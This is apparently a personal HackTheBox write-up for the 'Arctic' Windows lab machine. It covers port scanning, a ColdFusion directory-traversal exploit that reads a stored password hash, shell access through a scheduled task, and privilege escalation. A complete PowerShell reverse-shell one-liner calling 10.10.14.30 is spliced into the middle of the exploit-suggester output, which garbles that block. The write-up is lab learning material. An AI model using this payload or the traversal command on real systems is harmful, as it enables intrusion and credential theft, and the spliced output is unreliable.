# Enumerate

# Scan

* Full finds 125,8500,49154

```
pat@kali:~/Desktop/Cert_Prep/htb/Windows/Arctic$ scan 10.10.10.11
==================================
Found ports: 135,8500,49154
==================================
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-13 06:55 EDT
Nmap scan report for 10.10.10.11
Host is up (0.029s latency).

PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 146.75 seconds
```

## Explore Services

* No idea what fmtp is
* Use nmap msrpc scripts, the msrpc-enum didn't do anything. 
* Looked up some impacket interaction tools on https://www.hackingarticles.in/impacket-guide-smb-msrpc/
  * Didn't get anything other than some rpcss.dll versions? Can't be remotely exploited? 
* Trying to connect to the rpc or get info just times out everywhere. 
* Google and see that 8500 might be a web server. Even though I tried to curl it earlier and it timed out because everything is terrible. 

### Webpage

* Site is open directory contents. 
* wget recurse on the entire webpage to punish it for not responding to my curl earlier. Jokes on me because this would take three days probably. 
* Maybe some exploits for coldfusion depending on version. Some docs in the directories say version 8. Tried the 8.0.1 file upload and didn't work. 
  * Would be nice to try and port that to python since it doesn't seem to be anywhere online. 
* Tried a version 9 auth bypass that also didn't work. Tried a directory traversal script, didn't work. 
* Use an nse script to test for some stuff. Didn't find anything. 
* Website is so slow I can't even run dirbuster. 
* 14641.py works for directory traversal 

```
pat@kali:~/Desktop/Cert_Prep/htb/Windows/Arctic$ python 14641.py 10.10.10.11 8500 ./../../../../../../lib/password.properties
------------------------------
trying /CFIDE/wizards/common/_logintowizard.cfm
title from server in /CFIDE/wizards/common/_logintowizard.cfm:
------------------------------
#Wed Mar 22 20:53:51 EET 2017
rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP  \n
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
encrypted=true
```

# Access

* Crack password with John. 'happyday'
* Tried that on rpc again, no luck. 
* Log on to admin page. Took several minutes to even show the sidebar...
* Can create a new scheduled task. Need something that the server will run. Can't use bash anywhere because it's a windows machine so the pentestmonkey java shell won't work. Probably won't have nc or others. Need something running server side. PHP might work? JSP does. 
  * The task downloads and creats the file, then I can run it from the directory listing to get the shell. 
* Have tolis flag. 

# Escalate

* Ran systeminfo and exploit suggester

```
pat@kali:~/Desktop/Cert_Prep/htb/Windows/Arctic$ ./windows-exploit-suggester.py -i systeminfo.txt -d 2020-06-13-mssb.xls 
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (utf-8)
[*] querying database file for potential vulnerabilities
[*] comparing the 0 hotfix(es) against the 197 potential bulletins(s) with a database of 137 known exploits
[*] there are now 197 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2008 R2 64-bit'
[*] 
[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
[M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important
[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC
[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC
[*] 
[E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
[M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (98$client = New-Object System.Net.Sockets.TCPClient("10.10.14.30",1235);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()1957) - Important
[M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
[E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
[E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important
[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
[*] done
```

* For some reason the chimichurri thing that other people recommend doesn't work for me? I can't seem to run anything even. Uploaded a new reverse shell that isn't shitty and that doesn't run. Uploaded both various ways and nothing seems to help. The only thing I didn't try is remaking my JSP and redoing that part of getting a shell? Maybe mine's fucked or something? Or restarting the box. 
* Switched to a meterpreter shell, none of the metasploit suggestions work. 
* Oh my god...

```
pat@kali:~/Desktop/Cert_Prep/htb/Windows/Arctic$ file Chimichurri.exe 
Chimichurri.exe: HTML document, UTF-8 Unicode text, with very long lines
```

* Well did my best impression of a moderately competent child and downloaded the actual file. That solved the problem. 

# Lessons

* trying to find dirs in an app? Maybe there's a custom wordlist for it. 

